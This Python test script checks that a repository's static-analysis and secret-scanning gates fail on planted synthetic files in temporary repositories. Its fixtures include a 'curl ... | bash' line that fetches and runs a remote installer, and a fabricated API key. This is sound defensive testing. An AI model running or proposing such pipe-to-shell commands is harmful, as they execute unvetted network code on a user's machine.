"""Negative controls for scanner gates; synthetic files stay in temporary repositories."""
import pathlib
import json
import secrets
import shutil
import subprocess
import sys
import tempfile

repo = pathlib.Path(__file__).resolve().parents[1]
rules = pathlib.Path(sys.argv[1]).resolve()
mode = sys.argv[2] if len(sys.argv) > 2 else "all"

def check_static(content, name):
    with tempfile.TemporaryDirectory(prefix='awd-static-control-') as temp:
        root = pathlib.Path(temp)
        subprocess.run(['git', 'init', '-q', temp], check=True)
        target = root / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
        subprocess.run(['git', 'add', '.'], cwd=root, check=True)
        # nosemgrep: python.lang.security.audit.dangerous-subprocess-use-tainted-env-args -- Fixed Python/script executables; the caller-supplied path is only data and the target validates the pinned rules commit.
        result = subprocess.run([sys.executable, str(repo / 'scripts/security-static.py'), str(rules)], cwd=root, capture_output=True, text=True)
        assert result.returncode == 1, f'Control did not fail as a finding: {name}'
        report = json.loads(result.stdout)
        assert report['findings'] or report['errors'], f'No finding/error evidence: {name}'

if mode != '--secrets-only':
    check_static('fetch("http://example.invalid");\nconst broken = ???;\n', 'broken.ts')
    check_static('name: control\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n', '.github/workflows/control.yml')
    check_static('curl https://example.invalid/installer | bash\n', 'unsafe.sh')
if mode != '--static-only':
    with tempfile.TemporaryDirectory(prefix='awd-secret-control-') as temp:
        root = pathlib.Path(temp)
        subprocess.run(['git', 'init', '-q', temp], check=True)
        (root / 'scripts').mkdir()
        shutil.copyfile(repo / 'scripts/security-secret-fixtures.json', root / 'scripts/security-secret-fixtures.json')
        # Reuse an allowed fixture path, but a different fabricated value must still fail.
        (root / 'scripts/verify-w2.mts').write_text('const api_key = "' + secrets.token_hex(32) + '";\n')
        subprocess.run(['git', 'add', '.'], cwd=root, check=True)
        result = subprocess.run([sys.executable, str(repo / 'scripts/security-secrets.py')], cwd=root, capture_output=True, text=True)
        assert result.returncode == 1, 'Changed synthetic fixture bypassed secret gate'
        assert json.loads(result.stdout)['unapproved_findings'], 'Missing finding evidence'
print(f'PASS: security negative controls ({mode}) fail closed with finding/error evidence')
